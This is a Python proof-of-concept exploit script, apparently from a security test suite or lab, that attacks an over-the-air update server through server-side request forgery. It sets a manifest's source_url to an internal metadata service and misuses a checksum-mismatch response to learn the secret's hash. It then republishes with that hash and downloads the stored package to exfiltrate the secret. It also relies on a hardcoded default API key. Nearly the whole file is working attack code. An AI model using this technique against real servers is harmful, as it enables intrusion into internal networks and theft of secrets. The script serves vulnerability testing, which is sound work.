#!/usr/bin/env python3
"""
PoC #6: SSRF via the manifest's source_url -> internal secret disclosure
------------------------------------------------------------------------
handlePublish() (publish.go): when a manifest sets source_url, the server does
a plain http.Get(m.SourceURL) with no scheme allow-list and no host validation,
using whatever bytes come back as the package content. An attacker who can
publish (see #2/#7/#9) makes the OTA server itself issue requests to any address
it can reach - including services on the private compose network that were
never meant to be exposed to a publisher.

OTA has no secret of its own, so this PoC turns the SSRF into a real
secret-disclosure by pointing source_url at the shared fleet metadata service
(`metadata:9000/secret/ota`, see ../../metadata-service) - an internal-only
host on a `backend` network the attacker CANNOT reach directly. It then
exfiltrates that host's per-deployment secret through OTA in three network
steps, purely over OTA's own API:

  1. Publish a manifest whose source_url is the metadata secret, with a
     deliberately WRONG sha256. OTA fetches the internal secret server-side,
     then rejects on "checksum mismatch" - but the rejection helpfully echoes
     `computed`, the real sha256 of the bytes it just fetched. (Oracle: we now
     know the exact hash of a secret we were never allowed to see.)
  2. Re-publish the identical manifest with sha256 = that computed hash. The
     checksum now matches, so OTA stores the fetched internal bytes as a
     package.
  3. Download the stored package (`GET /updates/<module>/<version>/package`,
     no auth) and read the internal secret straight out of the bytes.

The recovered value is this deployment's real OTA_FLAG, materialized only
inside the metadata service (from the environment, never hardcoded; see
../../generate-secrets.sh), so the disclosure is scored against a genuine
per-deployment secret rather than a value baked into the repo.

Run: python3 06_source_url_ssrf.py [host] [port] [metadata_url] [expected_flag]

If metadata_url/expected_flag are omitted they default to the compose target
and the OTA_FLAG environment variable (falling back to the local-dev default).
"""
import hashlib
import json
import os
import sys
import urllib.error
import urllib.request
import uuid

HOST = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 8090
BASE = f"http://{HOST}:{PORT}"
METADATA_URL = sys.argv[3] if len(sys.argv) > 3 else "http://metadata:9000/secret/ota"
EXPECTED_FLAG = (sys.argv[4] if len(sys.argv) > 4
                 else os.environ.get("OTA_FLAG", "FLAG{local-dev-default}"))
SECRET_HINT = "internal-secret"
API_KEY = os.environ.get("OTA_API_KEY") or "ota-default-key-2024"
MODULE = "log"  # in OTA's fleet allowlist (fmm, ipm, log)


def multipart(fields):
    boundary = "----otaPoC" + uuid.uuid4().hex
    body = b""
    for name, value in fields.items():
        body += (f"--{boundary}\r\nContent-Disposition: form-data; "
                 f'name="{name}"\r\n\r\n{value}\r\n').encode()
    body += f"--{boundary}--\r\n".encode()
    return boundary, body


def publish(version, sha256_hex):
    manifest = {"module": MODULE, "version": version, "sha256": sha256_hex,
                "source_url": METADATA_URL}
    boundary, body = multipart({"manifest": json.dumps(manifest)})
    req = urllib.request.Request(f"{BASE}/publish", data=body, method="POST")
    req.add_header("Content-Type", f"multipart/form-data; boundary={boundary}")
    req.add_header("X-OTA-Api-Key", API_KEY)
    try:
        with urllib.request.urlopen(req, timeout=15) as r:
            return r.status, r.read().decode(errors="replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode(errors="replace")


def reachable_directly(url):
    try:
        urllib.request.urlopen(url, timeout=3).read()
        return True
    except Exception:
        return False


def main():
    if reachable_directly(METADATA_URL):
        print(f"[!] note: {METADATA_URL} is directly reachable from here; the SSRF is still "
              f"demonstrated, but network isolation would make it starker")
    else:
        print(f"[*] {METADATA_URL} is NOT directly reachable from the attacker - good")

    version = f"1.0.0-ssrf-{uuid.uuid4().hex[:8]}"

    # Step 1: wrong sha -> OTA fetches the internal secret, then leaks its hash.
    bogus = "0" * 64
    status, body = publish(version, bogus)
    print(f"[*] step 1 (bogus sha) /publish -> {status} {body[:200]}")
    if status == 401:
        # The API-key gate (vuln #2), not the SSRF. This deployment set a real
        # OTA_API_KEY that this PoC didn't present.
        print("[-] Rejected at the API-key gate. Provide the deployment's OTA_API_KEY:")
        print("      OTA_API_KEY=<key> python3 06_source_url_ssrf.py <host> <port>")
        print("    (the vuln_tests docker-compose passes it into the poc container for you.)")
        return 2
    try:
        computed = json.loads(body).get("computed", "")
    except json.JSONDecodeError:
        computed = ""
    if len(computed) != 64:
        print("[-] no 'computed' hash in the mismatch response; source_url may not have been "
              "fetched (SSRF blocked?) or the checksum error shape changed")
        return 1
    print(f"[*] oracle: OTA fetched the internal secret and revealed its sha256 = {computed}")

    # Step 2: matching sha -> OTA stores the fetched internal bytes as a package.
    status, body = publish(version, computed)
    print(f"[*] step 2 (matching sha) /publish -> {status} {body[:200]}")
    if status // 100 != 2:
        print("[-] republish with the computed sha did not succeed; cannot exfiltrate")
        return 1

    # Step 3: download the stored bytes (no auth) and read the secret out.
    try:
        with urllib.request.urlopen(f"{BASE}/updates/{MODULE}/{version}/package", timeout=15) as r:
            data = r.read().decode(errors="replace")
    except urllib.error.HTTPError as e:
        print(f"[-] download failed: {e.code} {e.read().decode(errors='replace')[:200]}")
        return 1
    print(f"[*] step 3 downloaded stored package ({len(data)} bytes)")

    if EXPECTED_FLAG in data:
        leaked = next((l.strip() for l in data.splitlines() if SECRET_HINT in l), "?")
        print(f"[+] SSRF disclosure confirmed: OTA fetched the internal-only metadata service on "
              f"our behalf and we exfiltrated this deployment's real secret {EXPECTED_FLAG!r} "
              f"(line: {leaked!r}) through the publish/download path")
        return 0

    print(f"[-] expected flag {EXPECTED_FLAG!r} not present in the exfiltrated bytes; SSRF may be "
          f"blocked, or OTA_FLAG doesn't match the running deployment")
    print("    bytes were:", data[:200])
    return 1


if __name__ == "__main__":
    sys.exit(main())
